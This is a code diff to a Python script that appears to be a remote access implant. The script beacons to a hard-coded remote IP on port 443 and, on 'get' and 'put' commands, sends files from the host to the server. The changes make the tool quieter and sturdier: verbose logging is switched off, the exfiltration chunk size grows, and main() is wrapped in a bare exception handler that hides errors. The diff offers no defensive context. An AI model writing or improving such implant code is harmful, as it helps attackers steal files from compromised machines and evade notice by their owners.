@@ -18,7 +18,7 @@ UUID = "67cf26b8-9942-11ea-a2db-bc14ef68ef25"   #python -c 'import uuid; print(u
 remote_ip = '192.168.119.149'
 remote_port = 443
 server_sni_hostname = ''
-VERBOSE = True
+VERBOSE = False
 DEVNULL = subprocess.DEVNULL
 BEACON_INTERVAL_DEFAULT = 30    #in seconds
 BEACON_INTERVAL_MEM = None
@@ -143,12 +143,12 @@ def send_data(conn, plain_text):
 
 def file_transfer_get(conn, file_name):      #push to server - response from a 'get'
     f = open(file_name, 'rb')
-    data = f.read(128)
+    data = f.read(1024)
     if VERBOSE:
         print_info("Sending File:\n" + file_name)
     while data:
         conn.send(data)
-        data = f.read(128)
+        data = f.read(1024)
     conn.send("[END]".encode('utf-8'))
     if VERBOSE:
         print_info("Done!")
@@ -254,7 +254,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
             if path.exists(file_name):
                 file_transfer_get(conn, file_name)
             else:
-                send_data(conn, "FILE_NOT_FOUND")
+                send_data(conn, "####FILE_#NOT#_FOUND####")
             data = ""
         elif "[put]" in data:
             if VERBOSE:
@@ -366,5 +366,7 @@ def main ():
                     print(e)
                 else:
                     pass
-
-main()
+try:
+    main()
+except:
+    pass
